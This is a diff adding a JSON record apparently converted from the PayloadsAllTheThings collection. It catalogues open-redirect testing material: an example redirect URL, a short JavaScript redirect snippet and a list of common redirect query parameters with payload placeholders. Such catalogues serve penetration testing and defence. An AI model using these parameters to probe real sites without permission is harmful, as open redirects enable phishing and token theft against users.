@@ -1,0 +1,50 @@
+{
+  "source": "PayloadsAllTheThings",
+  "exploit_type": "open_redirect",
+  "original_category": "Open Redirect",
+  "payloads": [
+    {
+      "category": "Methodology",
+      "escalation": "baseline",
+      "lines": [
+        "https://example.com/redirect?url=https://userpreferredsite.com"
+      ]
+    },
+    {
+      "category": "JavaScript-based Redirects",
+      "escalation": "baseline",
+      "lines": [
+        "var redirectTo = \"http://trusted.com\";",
+        "window.location = redirectTo;"
+      ]
+    },
+    {
+      "category": "Common Query Parameters",
+      "escalation": "baseline",
+      "lines": [
+        "?checkout_url={payload}",
+        "?continue={payload}",
+        "?dest={payload}",
+        "?destination={payload}",
+        "?go={payload}",
+        "?image_url={payload}",
+        "?next={payload}",
+        "?redir={payload}",
+        "?redirect_uri={payload}",
+        "?redirect_url={payload}",
+        "?redirect={payload}",
+        "?return_path={payload}",
+        "?return_to={payload}",
+        "?return={payload}",
+        "?returnTo={payload}",
+        "?rurl={payload}",
+        "?target={payload}",
+        "?url={payload}",
+        "?view={payload}",
+        "/{payload}",
+        "/redirect/{payload}"
+      ]
+    }
+  ],
+  "converted_at": "2026-04-03T07:48:28.872Z"
+}
